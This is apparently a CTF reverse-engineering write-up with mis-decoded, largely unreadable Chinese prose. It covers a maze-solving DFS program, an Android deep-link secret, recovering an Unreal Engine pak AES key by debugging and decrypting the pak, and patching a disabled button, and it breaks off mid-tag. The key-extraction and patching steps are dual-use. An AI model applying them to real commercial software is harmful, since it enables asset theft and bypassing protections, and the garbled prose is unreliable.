        <content type="html"><![CDATA[<p>æ•´ä½“æ„Ÿè§‰Reæœ‰ç‚¹åæ‚ï¼Œæœ‰æ”¶è·ï¼Œä¸»è¦æ˜¯æ‹¿äº†ä¸ªæ¯å­ï¼Œhhaã€‚ã€‚</p><a id="more"></a><h2 id="Re"><a href="#Re" class="headerlink" title="Re"></a>Re</h2><h3 id="A-Maze-In"><a href="#A-Maze-In" class="headerlink" title="A-Maze-In"></a>A-Maze-In</h3><p>è¿·å®«é¢˜ï¼Œä½†æ˜¯æœ‰ç‚¹ç‰¹åˆ«ï¼Œå°±æ˜¯æ¯ä¸ªæ­¥éª¤å¯¹åº”çš„åœ°å›¾ä¸ä¸€æ ·ã€‚ã€‚</p><p><img src="/2021/01/26/DJBCTF/image-20210126111337271-1611648503131.png" alt="image-20210126111337271"></p><p>æå–å‡º4ä¸ªåœ°å›¾åï¼Œå¼€å§‹æ‰‹èµ°äº†ä¸€ä¸‹ï¼Œè¦å‘½ã€‚ã€‚æƒ³åˆ°å†™ä¸€ä¸ªdfsæ¥æœç´¢ï¼Œè¿™ä¸ªåº”è¯¥æ˜¯å¯è¡Œçš„ï¼Œä½†æˆ‘æ²¡æœ‰æ³¨æ„å¥½èµ°è¿‡çš„è·¯å¾„æ ‡è®°å¯¼è‡´ä¸€ç›´é™·å…¥äº†å¾ªç¯ï¼Œæ‰¾ä¸è§£ã€‚ã€‚</p><p>åé¢ä»é€†å‘çš„è§’åº¦çœ‹ï¼Œè¿™ä¸ªè™½ç„¶æ­£ç€èµ°éº»çƒ¦ï¼Œä½†æ˜¯ä»ç»ˆç‚¹èµ°åˆ°èµ·ç‚¹æ˜¯æ¯ä¸€æ­¥éƒ½ç¡®å®šçš„ï¼Œèµ°é‚£ä¸€æ­¥çœ‹å®ƒåæ–¹å‘æ˜¯ä¸æ˜¯ä¸º1å³å¯ã€‚</p><p>å› ä¸ºæ¯ä¸€æ­¥ç¡®å®šè¿˜æ˜¯æ¯”è¾ƒå¥½èµ°çš„ï¼š<strong>LLDRRDLLLDRDLDDDRRULURRULURRDDDLDR</strong></p><p>èµ›åå¯¹æˆ‘ä¹‹å‰å†™çš„dfsï¼Œå‘ç°ä¸»è¦æ˜¯æ¯æ¬¡å¾€å›èµ°å¯¼è‡´ä¸€ç›´é™·å…¥ä¸€ä¸ªæ­»èƒ¡åŒï¼Œå°±æ˜¯èµ°äº†Lç„¶åèµ°Rï¼Œé‚£æ¯æ¬¡èµ°ä¹‹å‰åŠ äº†ä¸ªåˆ¤æ–­è¯•è¯•ã€‚ã€‚æœç„¶ï¼Œç§’å‡ºã€‚ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> byte_404018[] =</span><br><span class="line">&#123;</span><br><span class="line">    <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">0</span>, </span><br><span class="line">    <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">0</span>, </span><br><span class="line">    <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">1</span>, </span><br><span class="line">    <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">1</span>, </span><br><span class="line">    <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">1</span>, </span><br><span class="line">    <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">0</span>, </span><br><span class="line">    <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">0</span>, </span><br><span class="line">    <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">0</span>, </span><br><span class="line">    <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">0</span>, </span><br><span class="line">    <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">1</span>, </span><br><span class="line">    <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">0</span>, </span><br><span class="line">    <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">0</span>, </span><br><span class="line">    <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">1</span>, </span><br><span class="line">    <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">1</span>, </span><br><span class="line">    <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">1</span>, </span><br><span class="line">    <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">0</span>, </span><br><span class="line">    <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">0</span>, </span><br><span class="line">    <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">0</span>, </span><br><span class="line">    <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">0</span>, </span><br><span class="line">    <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">1</span>, </span><br><span class="line">    <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">0</span>, </span><br><span class="line">    <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">1</span>, </span><br><span class="line">    <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">0</span>, </span><br><span class="line">    <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">1</span>, </span><br><span class="line">    <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">0</span>, </span><br><span class="line">    <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">0</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">char</span> flag[<span class="number">100</span>];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">dfs</span><span class="params">(<span class="keyword">int</span> i, <span class="keyword">int</span> v5, <span class="keyword">int</span> v4, <span class="keyword">char</span> ch)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> j = <span class="number">0</span>, k = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(i &gt; <span class="number">33</span> ) </span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span>(v4 == <span class="number">4</span>  &amp;&amp; v5 == <span class="number">7</span>) </span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"yes: %s\n"</span>, flag);</span><br><span class="line">getchar();</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (ch != <span class="string">'L'</span> &amp;&amp; (v5 &gt;= <span class="number">0</span> &amp;&amp; v4 &gt;= <span class="number">0</span>) &amp;&amp; (byte_404018+<span class="number">3</span>)[<span class="number">32</span> * v5 + <span class="number">4</span> * v4] == <span class="number">1</span> )</span><br><span class="line">  &#123; </span><br><span class="line">flag[i] = <span class="string">'R'</span>;</span><br><span class="line">    dfs(i+<span class="number">1</span>, v5, v4+<span class="number">1</span>, <span class="string">'R'</span>);</span><br><span class="line">  &#125; </span><br><span class="line">   </span><br><span class="line"><span class="keyword">if</span> (ch != <span class="string">'R'</span> &amp;&amp; (v5 &gt;= <span class="number">0</span> &amp;&amp; v4 &gt;= <span class="number">0</span>) &amp;&amp; (byte_404018+<span class="number">2</span>)[<span class="number">32</span> * v5 + <span class="number">4</span> * v4] == <span class="number">1</span> )</span><br><span class="line">&#123;</span><br><span class="line">flag[i] = <span class="string">'L'</span>;</span><br><span class="line">dfs(i+<span class="number">1</span>, v5, v4<span class="number">-1</span>, <span class="string">'L'</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">if</span> (ch != <span class="string">'U'</span> &amp;&amp; (v5 &gt;= <span class="number">0</span> &amp;&amp; v4 &gt;= <span class="number">0</span>) &amp;&amp; (byte_404018+<span class="number">1</span>)[<span class="number">32</span> * v5 + <span class="number">4</span> * v4] == <span class="number">1</span> )</span><br><span class="line">&#123;</span><br><span class="line">flag[i] = <span class="string">'D'</span>;</span><br><span class="line"></span><br><span class="line">dfs(i+<span class="number">1</span>, v5+<span class="number">1</span>, v4, <span class="string">'D'</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (ch != <span class="string">'D'</span> &amp;&amp;  (v5 &gt;= <span class="number">0</span> &amp;&amp; v4 &gt;= <span class="number">0</span>) &amp;&amp; byte_404018[<span class="number">32</span> * v5 + <span class="number">4</span> * v4] == <span class="number">1</span> )</span><br><span class="line">&#123;</span><br><span class="line">flag[i] = <span class="string">'U'</span>;</span><br><span class="line">dfs(i+<span class="number">1</span>, v5<span class="number">-1</span>, v4, <span class="string">'U'</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">dfs(<span class="number">0</span>, <span class="number">0</span>, <span class="number">3</span>, <span class="string">'1'</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="Matara-Okina"><a href="#Matara-Okina" class="headerlink" title="Matara Okina"></a>Matara Okina</h3><p>æœ¬æ¥æ²¡æ€ä¹ˆåšè¿‡å®‰å“ï¼Œä»è¿™ä¸ªé¢˜å­¦äº†ä¸å°‘ï¼Œæ¯”èµ›æœŸé—´å¤§å¤šæ•°æ—¶é—´éƒ½å»å­¦å®‰å“äº†ï¼Œè™½ç„¶å¯¹è§£å†³æœ¬é¢˜ç”¨ä¸ä¸Šï¼Œä½†ç”±æ­¤æ„Ÿè§‰å®‰å“è¿˜æ˜¯æŒºå¥½ç©çš„ã€‚</p><p>å¼€å§‹æ‹¿åˆ°é¢˜ç›®å¯¹ä¸‹é¢å°±æœ‰ç‚¹ç–‘æƒ‘ï¼š</p><p><img src="/2021/01/26/DJBCTF/image-20210125114031206-1611648521523.png" alt="image-20210125114031206"></p><p>çŸ¥é“æ˜¯å–å‡ºsecretå‚æ•°çš„å€¼ç»è¿‡å¼‚æˆ–è¿ç®—åå’Œä¸€ä¸ªanså­—ç¬¦ä¸²æ¯”è¾ƒä¸€ä¸‹ã€‚é‚£å°±å…ˆæ±‚å‡ºæ¥çœ‹çœ‹ï¼š<strong>Android_scheme_is_FUN</strong></p><p>å¼€å§‹ä»¥ä¸ºè¿™å°±æ˜¯flagï¼Œç»“æœä¸æ˜¯ï¼Œä»”ç»†çœ‹åˆ°æ˜¯æŠŠè¿™ä¸ªå­—ç¬¦ä¸²ä¼ å…¥ä¸€ä¸ªnativeå±‚çš„checkçš„å‡½æ•°çš„ï¼Œé€šè¿‡ä¸€äº›è¿ç®—æ˜¾ç¤ºå‡ºæ¥ã€‚ã€‚å…¶æ¬¡çœ‹åˆ°schemeï¼ŒåŠ ä¸Šä¹‹å‰çš„uriï¼Œçªç„¶æ˜ç™½äº†ã€‚ã€‚å†åˆ°Mainifestçœ‹çœ‹ï¼Œæœç„¶ï¼š</p><p><img src="/2021/01/26/DJBCTF/image-20210125114541846-1611648525744.png" alt="image-20210125114541846"></p><p>å°±ç±»ä¼¼æˆ‘ä»¬ç‚¹å‡»ä¸€ä¸ªé“¾æ¥æ‰“å¼€appä¸€æ ·ï¼Œè‡ªå·±å†™ä¸€ä¸ªç½‘é¡µé“¾æ¥è®©æ‰‹æœºç‚¹ä¸€ä¸‹å°±å¯ä»¥äº†ã€‚</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"sh0w://p4th/70/1nput?secret=Android_scheme_is_FUN"</span>&gt;</span>app<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="UnrealFlag"><a href="#UnrealFlag" class="headerlink" title="UnrealFlag"></a>UnrealFlag</h3><p>å¯¹äºè¿™ä¸ªé¢˜ï¼Œå…¶å®å°±æ˜¯ä¸€ä¸ªè§£å¯†ä¸€ä¸ªæ¸¸æˆä¸­åŠ å¯†çš„æ•°æ®ï¼ŒæŒºå®æˆ˜çš„ï¼Œæ¯”èµ›æ—¶æ²¡åšï¼Œä¹Ÿæ˜¯ä¿¡æ¯æœç´¢èƒ½åŠ›æ²¡åˆ°ä½ï¼ŒçŸ¥é“è¦è§£å¯†pakæ–‡ä»¶ä½†æ˜¯googleï¼Œbaiduäº†åŠå¤©éƒ½æ²¡æ‰¾åˆ°ä¸€ä¸ªåˆé€‚çš„æ–‡ç« ã€‚è¿™ä¸ªæ–‡ç« èµ›åçœ‹åˆ°çš„ï¼Œå¾ˆæ¸…æ™°ä¸”å…¨ï¼š<a href="https://blog.jamie.holdings/2019/03/23/reverse-engineering-aes-keys-from-unreal-engine-4-projects/" target="_blank" rel="noopener">Reverse Engineering AES Keys From Unreal Engine 4 Projects</a></p><p>å‰æœŸå‡†å¤‡å°±æ˜¯ä¸‹è½½è¦è§£å¯†æ–‡ä»¶å¯¹åº”æ¸¸æˆä½¿ç”¨çš„è™šå¹»å¼•æ“ç‰ˆæœ¬ï¼Œè¿™é‡Œ4.26ã€‚</p><p>ç„¶åæ‰¾åˆ°è¦è§£å¯†æ–‡ä»¶ä½¿ç”¨çš„keyï¼Œæœ€åä½¿ç”¨ä¸‹è½½å¼•æ“ä¸­æä¾›çš„Urealpak.exeè§£å¯†å³å¯ã€‚</p><p>å¼€å§‹æ‰¾key:</p><p>æ‰¾åˆ°å®‰è£…å¼•æ“ç›®å½•çš„ï¼š<strong>D:\Epic Games\UE_4.26\Engine\Source\Runtime\PakFile\Private\IPlatformFilePak.cpp</strong>æ–‡ä»¶ï¼ŒæŸ¥çœ‹ä»£ç ï¼Œè™½ç„¶è¿™ä¸ªå¼•æ“ç‰ˆæœ¬å¯èƒ½ä¼šæœ‰ä¸€å®šçš„åŒºåˆ«ï¼Œä½†éƒ½æ˜¯DecryptDataä¸‹æ‰‹ï¼šç¬¬ä¸‰ä¸ªå‚æ•°å³æ˜¯ã€‚</p><p><img src="/2021/01/26/DJBCTF/image-20210126140813667-1611648530624.png" alt="image-20210126140813667">)å½“ä¸ºäº†åœ¨è°ƒè¯•çš„æ—¶å€™å¥½å®šä½åˆ°ä¸Šé¢è¿™ä¸ªå‡½æ•°ï¼Œæˆ‘ä»¬ä¸€èˆ¬çš„æ–¹æ³•æ˜¯æ‰¾åˆ°è°ƒç”¨å®ƒçš„åœ°æ–¹ï¼Œç›´åˆ°æœ‰é”™è¯¯å­—ç¬¦ä¸²ä¿¡æ¯å‡ºç°ï¼ˆæ–¹ä¾¿æˆ‘ä»¬å®šä½ï¼‰ã€‚æ‰¾å¼•ç”¨çš„æ—¶å€™å¯èƒ½å‡ºç°å¾ˆå¤šå‡½æ•°è°ƒç”¨å®ƒçš„æƒ…å†µï¼Œä½†ä¸€èˆ¬ä»¥LoadIndex()å‡½æ•°ä¸ºæœ€ä¸Šå±‚çš„å‡½æ•°ï¼Œè‡³äºåŸå› ï¼Œä¸Šé¢æ–‡ç« æœ‰æåˆ°ï¼š</p><p><img src="/2021/01/26/DJBCTF/image-20210126140646329-1611648534391.png" alt="image-20210126140646329"></p><p>ä¸€ç›´å‘ä¸Šå›æº¯æ‰¾åˆ°äº†ç¬¬ä¸€æ¬¡å‡ºç°å­—ç¬¦ä¸²çš„åœ°æ–¹ï¼Œx64æœç´¢çœ‹çœ‹ï¼Œæœ‰çš„ã€‚</p><p><img src="/2021/01/26/DJBCTF/image-20210126142130832-1611648537839.png" alt="image-20210126142130832"></p><p>ç„¶ååœ¨x64ä¸­çœ‹çš„æ—¶å€™ï¼Œæºä»£ç ä¸å…¶åæ±‡ç¼–çš„ç»“æœå¹¶ä¸æ˜¯ä¸€ä¸€å¯¹åº”çš„ï¼Œæœ‰å¯èƒ½ä¸€ä¸ªå‡½æ•°æ˜¯å†…è”å‡½æ•°å’Œåæ±‡ç¼–ç»“æœæ˜¯å¯¹ä¸€ä¸ªå‡½æ•°è¿›è¡Œäº†å±•å¼€ã€‚è¿™é‡Œå°±æ˜¯ï¼š</p><p>é¦–å…ˆçœ‹å®šä½åˆ°å­—ç¬¦ä¸²é‚£ä¸€éƒ¨åˆ†çš„æºä»£ç ï¼š</p><p><img src="/2021/01/26/DJBCTF/image-20210126151157572-1611648541083.png" alt="image-20210126151157572"></p><p>ç„¶åx64ä¸­çš„æƒ…å†µï¼š</p><p><img src="/2021/01/26/DJBCTF/image-20210126151408840-1611648544164.png" alt="image-20210126151408840"></p><p>æ‰€ä»¥è¿™é‡Œç›´æ¥è·Ÿè¿›æˆ‘ä¸‹æ–­ç‚¹çš„å‡½æ•°ï¼Œç„¶åä»æºä»£ç å¯çŸ¥ï¼Œæœ€åå¯ä»ç¬¬ä¸‰ä¸ªå‚æ•°è·å–keyçš„å‡½æ•°åœ¨æœ€åä¸€ä¸ªï¼Œä½†æˆ‘ä»¬åœ¨x64ä¸­çœ‹åˆ°çš„æ˜¯ç¼–è¯‘åçš„ç»“æœï¼Œä¸€èˆ¬ç¼–è¯‘å™¨éƒ½ä¼šåœ¨åˆå§‹å’Œæœ«å°¾æ·»åŠ ä¸€äº›æ£€æŸ¥å‡½æ•°çš„ï¼Œè¿™é‡Œå¤§æ¦‚çŒœä¸€ä¸‹ï¼Œå…ˆåœ¨å€’æ•°ç¬¬äºŒä¸ªå‡½æ•°å¤„ä¸‹æ–­ç„¶åçœ‹r8å¯„å­˜å™¨çš„å€¼ï¼Œå¦‚æœä¸è¡Œç»§ç»­æ¢åˆ«çš„å°±æ˜¯ï¼Œåæ­£èŒƒå›´å°±è¿™ä¹ˆå‡ ä¸ªå‡½æ•°ã€‚</p><p>æˆåŠŸå¾—åˆ°keyï¼Œä»hexè½¬åŒ–ä¸ºbase64å°±å¥½äº†ã€‚</p><p><img src="/2021/01/26/DJBCTF/image-20210126152347350-1611648547783.png" alt="image-20210126152347350"></p><p>æœ€åï¼šUnrealPak.exe accepts a â€œcrypto.jsonâ€ parameter. You will want to create this file somewhere and add the followingï¼Œå³åˆ›å»ºä¸€ä¸ªå’Œä¸‹é¢ç±»ä¼¼çš„æ–‡ä»¶ï¼ŒæŠŠæ‰¾åˆ°çš„keyå†™å…¥æŒ‡å®šä½ç½®ã€‚</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  <span class="attr">"$types"</span>: &#123;</span><br><span class="line">    <span class="attr">"UnrealBuildTool.EncryptionAndSigning+CryptoSettings, UnrealBuildTool, Version=4.0.0.0, Culture=neutral, PublicKeyToken=null"</span>: <span class="string">"1"</span>,</span><br><span class="line">    <span class="attr">"UnrealBuildTool.EncryptionAndSigning+EncryptionKey, UnrealBuildTool, Version=4.0.0.0, Culture=neutral, PublicKeyToken=null"</span>: <span class="string">"2"</span></span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="attr">"$type"</span>: <span class="string">"1"</span>,</span><br><span class="line">  <span class="attr">"EncryptionKey"</span>: &#123;</span><br><span class="line">    <span class="attr">"$type"</span>: <span class="string">"2"</span>,</span><br><span class="line">    <span class="attr">"Name"</span>: <span class="literal">null</span>,</span><br><span class="line">    <span class="attr">"Guid"</span>: <span class="literal">null</span>,</span><br><span class="line">    <span class="attr">"Key"</span>: <span class="string">"uZFnisGm9AFdQ2hGBMRKm38+LAShgkbEMJOn8bv/arc="</span></span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="attr">"SigningKey"</span>: <span class="literal">null</span>,</span><br><span class="line">  <span class="attr">"bEnablePakSigning"</span>: <span class="literal">false</span>,</span><br><span class="line">  <span class="attr">"bEnablePakIndexEncryption"</span>: <span class="literal">true</span>,</span><br><span class="line">  <span class="attr">"bEnablePakIniEncryption"</span>: <span class="literal">true</span>,</span><br><span class="line">  <span class="attr">"bEnablePakUAssetEncryption"</span>: <span class="literal">false</span>,</span><br><span class="line">  <span class="attr">"bEnablePakFullAssetEncryption"</span>: <span class="literal">false</span>,</span><br><span class="line">  <span class="attr">"bDataCryptoRequired"</span>: <span class="literal">true</span>,</span><br><span class="line">  <span class="attr">"SecondaryEncryptionKeys"</span>: []</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æ¥ä¸‹æ¥ç”¨æŒ‡å®šæ ¼å¼çš„commandè§£å¯†ï¼š</p><figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">"D:<span class="symbol">\E</span>pic Games"<span class="symbol">\U</span>E_4.26<span class="symbol">\E</span>ngine<span class="symbol">\B</span>inaries<span class="symbol">\W</span>in64<span class="symbol">\U</span>nrealpak.exe FindFlag-WindowsNoEditor.pak -Extract C:<span class="symbol">\U</span>sers<span class="symbol">\1</span>1480<span class="symbol">\D</span>esktop<span class="symbol">\s</span>ss<span class="symbol">\ </span>-cryptokeys=C:<span class="symbol">\U</span>sers<span class="symbol">\1</span>1480<span class="symbol">\D</span>esktop<span class="symbol">\s</span>ss<span class="symbol">\c</span>rypto.json</span><br></pre></td></tr></table></figure><p>ä¸€èˆ¬è§£å¯†æ¸¸æˆä¸­çš„æ•°æ®å°±æ˜¯å„ç§æ¨¡å‹ï¼Œflagä¹Ÿåº”è¯¥ä¹Ÿæ˜¯ä¸€ä¸ªç±»ä¼¼çš„æ¨¡å‹æ–‡ä»¶ï¼Œä½¿ç”¨umodelæ‰“æ–‡ä»¶<strong>flag.uasset</strong>ï¼Œå†è½¬åŒ–æˆpngä¿å­˜å°±å¥½äº†ã€‚</p><p><img src="/2021/01/26/DJBCTF/image-20210126160135944-1611648556272.png" alt="image-20210126160135944"></p><h3 id="anniu"><a href="#anniu" class="headerlink" title="anniu"></a>anniu</h3><p>å¼€å§‹å°±çŸ¥é“è¦è®©ç°è‰²æŒ‰é’®å¯ç”¨ï¼Œæ‰¾äº†enablewindowå‡½æ•°ï¼Œä½†æ˜¯ä¸è¡Œï¼Œç„¶åè¿™ä¸ªæ˜¯æ˜“è¯­è¨€å†™çš„ç¨‹åºå’Œä»¥å¾€åšçš„æœ‰ç‚¹ä¸ä¸€æ ·ã€‚ã€‚æ‰¾æŒ‰é’®äº‹ä»¶åˆæ²¡æ‰¾åˆ°ï¼Ÿã€‚ã€‚å¥‡æ€ªã€‚</p><p>æœ€åç›´æ¥ODä»å¼€å§‹è·Ÿè¸ªç¨‹åºåˆ›å»ºçª—å£çš„è¿‡ç¨‹ã€‚å…¶å®å°±æ˜¯å¾ˆå¤šä¸ªå­çª—å£å åŠ çš„ã€‚ä»åˆ›å»ºflagæŒ‰é’®çš„creatwindowsexæ‰¾åˆ°äº†ç«¯å€ªï¼Œæˆ‘æ‰çŸ¥é“å¯ä»¥åˆ›å»ºçª—å£çš„æ—¶å€™è®©æ§ä»¶ä¸å¯ç”¨ã€‚ã€‚</p><p>å…¶ä¸­çš„WS_DISABLEDä»VSæŸ¥åˆ°äº†æ˜¯0x08000000ï¼Œæ‰€ä»¥æˆ‘æŠŠæ•´ä¸ªå€¼æ”¹ä¸º0x44012F00å³å¯ã€‚</p><p><img src="/2021/01/26/DJBCTF/image-20210125115444155-1611648561584.png" alt="image-20210125115444155"></p><h3 id="warmup"><a href="#warmup" class="headerlink" 